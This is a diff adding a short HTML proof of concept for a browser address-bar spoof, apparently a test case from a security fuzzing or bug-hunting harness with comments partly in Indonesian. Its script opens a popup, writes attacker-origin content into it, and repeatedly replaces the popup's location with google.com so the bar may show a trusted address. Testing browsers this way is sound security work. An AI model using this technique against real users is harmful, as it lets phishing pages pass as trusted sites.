@@ -1,0 +1,15 @@
+<!-- 2 | address-bar spoof - popup never-commit | [1-CLICK]
+     GENOME  A=replace-loop (commit tak pernah selesai)  B=window.open('','')  C=click  D=S1  F=child document.write
+     PREDIKAT      omnibox popup menulis https://www.google.com , isinya ditulis origin penyerang
+     EXPECTED-SECURE  popup menampilkan about:blank / origin penyerang
+     KONTROL  file 3.html -->
+<button onclick="go()">Run 2</button>
+<p id=r></p>
+<script>
+document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+function go() {
+  var w = window.open('', '');
+  w.document.write('<h2>SPOOFED &mdash; ditulis oleh ' + location.origin + '</h2>');
+  setInterval(function () { w.location.replace('https://www.google.com/'); }, 30);
+}
+</script>
